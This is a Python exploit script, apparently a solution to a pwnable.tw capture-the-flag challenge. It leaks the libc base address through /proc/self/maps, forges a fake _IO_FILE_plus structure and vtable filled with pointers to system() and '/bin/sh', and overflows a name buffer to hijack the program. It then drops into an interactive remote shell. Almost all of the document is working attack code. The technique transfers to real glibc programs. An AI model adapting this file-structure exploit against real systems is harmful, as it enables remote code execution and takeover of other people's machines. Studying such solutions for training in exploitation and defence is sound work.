import sys, socket, struct, telnetlib

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a): 
    return struct.pack("<I",a)

def u(a):
    return struct.unpack("<I",a)[0]

def open_file(path):
    read_until(f, "Your choice :")
    f.write("1\n")
    read_until(f, "What do you want to see :")
    f.write(path + "\n")
    
def read_file():
    read_until(f, "Your choice :")
    f.write("2\n")
    
def write_file():
    read_until(f, "Your choice :")
    f.write("3\n")

def main():
    open_file("/proc/self/maps")
    read_file()
    write_file()
    read_file()
    write_file()
    read_until(f) # Need adjustment in your environment if you do local test.
    libc_base = int(f.read(8),16)
    system = libc_base + libc_system_offset
    print "libc base addr:",hex(libc_base)
    print "system addr:",hex(system)

    buf = "\x00"*32
    buf += p(0x804b284) 
    # Fake _IO_FILE_plus
    buf += "/bin/sh\0"
    buf += p(0)*16
    buf += p(0x804b284+0x98)
    buf += p(0)*18
    buf += p(0x804b284+0x98)
    # Fake _IO_jump_t
    buf += p(0)*2 
    buf += p(system)*19 

    read_until(f, "Your choice :")
    f.write("5\n")
    read_until(f, "Leave your name :")
    f.write(buf + "\n")

    shell(s)          

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("chall.pwnable.tw", 10200)
        libc_system_offset = 0x0003a940
        main()
    else:
        s, f = sock("localhost", 10200)
        libc_system_offset = 0x00040310
        main()
